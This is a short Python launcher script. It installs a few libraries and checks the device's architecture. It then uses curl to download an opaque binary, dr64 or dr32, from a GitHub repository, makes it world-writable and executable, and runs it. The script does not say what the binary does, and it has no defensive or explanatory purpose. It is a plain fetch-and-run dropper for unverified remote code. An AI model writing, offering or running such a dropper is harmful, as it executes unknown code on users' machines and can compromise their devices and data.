#utf-8 orginal write rana aahil
import os,sys,subprocess
try:
    import requests
except:
    os.system("pip install requests")
try:
    import rich
except:
    os.system("pip install rich")
try:
    import mechanize
except:
    os.system("pip install mechanize")

cwd = subprocess.check_output('uname -om', shell=True)
cwd = str(cwd)

if 'aarch64' in cwd:
    if not os.path.isfile('dr64'):
        os.system('curl -L https://github.com/MR-RIKI/D3M09_SERVER/blob/main/64bit/dr64?raw=true > dr64')
        os.system('chmod 777 dr64')
        os.system('./dr64')
    else:
        os.system('./dr64')
elif 'arm' in cwd:
    if not os.path.isfile('dr32'):
        os.system('curl -L https://github.com/MR-RIKI/D3M09_SERVER/blob/main/32bit/dr32?raw=true > dr32')
        os.system('chmod 777 dr32')
        os.system('./dr32')
    else:
        os.system('./dr32')
else:
    exit(" we can't find your bit sory :) ")
